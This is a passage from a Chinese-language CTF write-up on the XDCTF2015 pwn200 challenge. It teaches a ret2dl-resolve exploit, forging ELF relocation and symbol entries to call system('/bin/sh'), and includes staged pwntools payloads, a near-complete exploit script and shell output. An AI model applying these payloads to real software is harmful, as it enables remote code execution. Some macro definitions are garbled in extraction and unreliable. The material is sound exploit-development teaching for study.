6.1.3 pwn XDCTF2015 pwn200
gdb-peda$ disassemble write
Dump of assembler code for function write@plt:
0x08048430 : jmp DWORD PTR ds:0x804a01c
0x08048436 : push 0x20
0x0804843b : jmp 0x80483e0
End of assembler dump.
这次我们跳过这个过程，直接控制 eip 跳转到 PLT[0]，并在栈上布置上
reloc_index，即 0x20 ，就像是调用了 write@plt 一样。
reloc_index = 0x20
payload_3 = "AAAA"
payload_3 += p32(plt_0)
payload_3 += p32(reloc_index)
payload_3 += "AAAA"
payload_3 += p32(1)
payload_3 += p32(base_addr + 80)
payload_3 += p32(len("/bin/sh"))
payload_3 += "A" * (80 - len(payload_3))
payload_3 += "/bin/sh\x00"
payload_3 += "A" * (100 - len(payload_3))
io.sendline(payload_3)
print io.recv()
接下来，我们更进一步，伪造一个 write 函数的 Elf32_Rel 结构体，原结构体在
.rel.plt 中，如下所示：
typedef struct
{
Elf32_Addr r_offset; /* Address */
Elf32_Word r_info; /* Relocation type and symbol in
dex */
} Elf32_Rel;
930
6.1.3 pwn XDCTF2015 pwn200
$ readelf -r a.out | grep write
0804a01c 00000707 R_386_JUMP_SLOT 00000000 write@GLIBC_2.0
该结构体的 r_offset 是 write@got 地址，即 0x0804a01c ， r_info 是
0x707 。动态装载器通过 reloc_index 找到它，而 reloc_index 是相对于
.rel.plt 的偏移，所以我们如果控制了这个偏移，就可以跳转到伪造的 write
上。payload 如下：
reloc_index = base_addr + 28 - rel_plt # fake_reloc = base_addr
+ 28
r_info = 0x707
fake_reloc = p32(write_got) + p32(r_info)
payload_4 = "AAAA"
payload_4 += p32(plt_0)
payload_4 += p32(reloc_index)
payload_4 += "AAAA"
payload_4 += p32(1)
payload_4 += p32(base_addr + 80)
payload_4 += p32(len("/bin/sh"))
payload_4 += fake_reloc
payload_4 += "A" * (80 - len(payload_4))
payload_4 += "/bin/sh\x00"
payload_4 += "A" * (100 - len(payload_4))
io.sendline(payload_4)
print io.recv()
另外讲一讲 Elf32_Rel 值的计算方法如下，我们下面会得用到：
#define ELF32_R_SYM(val) ((val) >> 8)
#define ELF32_R_TYPE(val) ((val) & 0xff)
#define ELF32_R_INFO(sym, type) (((sym) > 8) = 0x7 ，即 .dynsym 的第 7 行
931
6.1.3 pwn XDCTF2015 pwn200
ELF32_R_TYPE(0x707) = (0x707 & 0xff) = 0x7 ，即 #define
R_386_JMP_SLOT 7 /* Create PLT entry */
ELF32_R_INFO(0x7, 0x7) = (((0x7  Create PLT entry
r_info = (r_sym > 4)
#define ELF32_ST_TYPE(val) ((val) & 0xf)
#define ELF32_ST_INFO(bind, type) (((bind) > 4) = 0x1 ，
即 #define STB_GLOBAL 1 /* Global symbol */
ELF32_ST_TYPE(0x12) = ((0x12) & 0xf) = 0x2 ，即 #define
STT_FUNC 2 /* Symbol is a code object */
ELF32_ST_INFO(0x1, 0x2) = (((0x1)  Global symbol
st_type = 0x2 # STT_FUNC -> Symbol is a code object
st_info = (st_bind << 4) + (st_type & 0xf) # 0x12
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
payload_6 = "AAAA"
payload_6 += p32(plt_0)
payload_6 += p32(reloc_index)
payload_6 += "AAAA"
payload_6 += p32(1)
payload_6 += p32(base_addr + 80)
payload_6 += p32(len("/bin/sh"))
payload_6 += fake_reloc
payload_6 += "A" * align
payload_6 += fake_sym
payload_6 += "write\x00"
payload_6 += "A" * (80 - len(payload_6))
payload_6 += "/bin/sh\x00"
payload_6 += "A" * (100 - len(payload_6))
io.sendline(payload_6)
print io.recv()
最后，只要将 "write" 替换成任何我们希望的函数，并调整参数，就可以了，这里我
们换成 "system"，拿到 shell：
935
6.1.3 pwn XDCTF2015 pwn200
reloc_index = base_addr + 28 - rel_plt
fake_sym_addr = base_addr + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
r_sym = (fake_sym_addr - dynsym) / 0x10
r_type = 0x7
r_info = (r_sym << 8) + (r_type & 0xff)
fake_reloc = p32(write_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
st_bind = 0x1
st_type = 0x2
st_info = (st_bind << 4) + (st_type & 0xf)
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(st_info)
payload_7 = "AAAA"
payload_7 += p32(plt_0)
payload_7 += p32(reloc_index)
payload_7 += "AAAA"
payload_7 += p32(base_addr + 80)
payload_7 += "AAAA"
payload_7 += "AAAA"
payload_7 += fake_reloc
payload_7 += "A" * align
payload_7 += fake_sym
payload_7 += "system\x00"
payload_7 += "A" * (80 - len(payload_7))
payload_7 += "/bin/sh\x00"
payload_7 += "A" * (100 - len(payload_7))
io.sendline(payload_7)
io.interactive()
Bingo!!!
936
6.1.3 pwn XDCTF2015 pwn200
$ python2 exp.py
[*] '/home/firmy/Desktop/a.out'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ whoami
firmy
这题是 32 位程序，在 64 位下会有一些变化，比如说：
64 位程序一般情况下使用寄存器传参，但给 _dl_runtime_resolve 传参时
使用栈
_dl_runtime_resolve 函数的第二个参数 reloc_index 由偏移变为了索
引。
_dl_fixup 函数中，在伪造 fake_sym 后，可能会造成崩溃，需要将
link_map+0x1c8 地址上的值置零
具体的以后遇到再说。
如果觉得手工构造太麻烦，有一个工具 roputils 可以简化此过程，感兴趣的同学可
以自行尝试。
漏洞利用
完整的 exp 如下：
from pwn import *
# context.log_level = 'debug'
elf = ELF('./a.out')
io = remote('127.0.0.1', 10001)
io.recv()
937
6.1.3 pwn XDCTF2015 pwn200
pppr_addr = 0x08048699 # pop esi ; pop edi ; pop ebp ;
ret
pop_ebp_addr = 0x0804869b # pop ebp ; ret
leave_ret_addr = 0x080484b6 # leave ; ret
write_plt = elf.plt['write']
write_got = elf.got['write']
read_plt = elf.plt['read']
plt_0 = elf.get_section_by_name('.plt').header.sh_addr
# 0x80483e0
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# 0x8048390
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
# 0x80481cc
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
# 0x804828c
bss_addr = elf.get_section_by_name('.bss').header.sh_addr
# 0x804a028
base_addr = bss_addr + 0x600 # 0x804a628
payload_1 = "A" * 112
payload_1 += p32(read_plt)
payload_1 += p32(pppr_addr)
payload_1 += p32(0)
payload_1 += p32(base_addr)
payload_1 += p32(100)
payload_1 += p32(pop_ebp_addr)
payload_1 += p32(base_addr)
payload_1 += p32(leave_ret_addr)
io.send(payload_1)
# payload_2 = "AAAA" # new ebp
# payload_2 += p32(write_plt)
# payload_2 += "AAAA"
# payload_2 += p32(1)
# payload_2 += p32(base_addr + 80)
# payload_2 += p32(len("/bin/sh"))
# payload_2 += "A" * (80 - len(payload_2))
938
6.1.3 pwn XDCTF2015 pwn200
# payload_2 += "/bin/sh\x00"
# payload_2 += "A" * (100 - len(payload_2))
# io.sendline(payload_2)
# print io.recv()
# reloc_index = 0x20
# payload_3 = "AAAA"
# payload_3 += p32(plt_0)
# payload_3 += p32(reloc_index)
# payload_3 += "AAAA"
# payload_3 += p32(1)
# payload_3 += p32(base_addr + 80)
# payload_3 += p32(len("/bin/sh"))
# payload_3 += "A" * (80 - len(payload_3))
# payload_3 += "/bin/sh\x00"
# payload_3 += "A" * (100 - len(payload_3))
# io.sendline(payload_3)
# print io.recv()
# reloc_index = base_addr + 28 - rel_plt # fake_reloc = base_ad
dr + 28
# r_info = 0x707
# fake_reloc = p32(write_got) + p32(r_info)
# payload_4 = "AAAA"
# payload_4 += p32(plt_0)
# payload_4 += p32(reloc_index)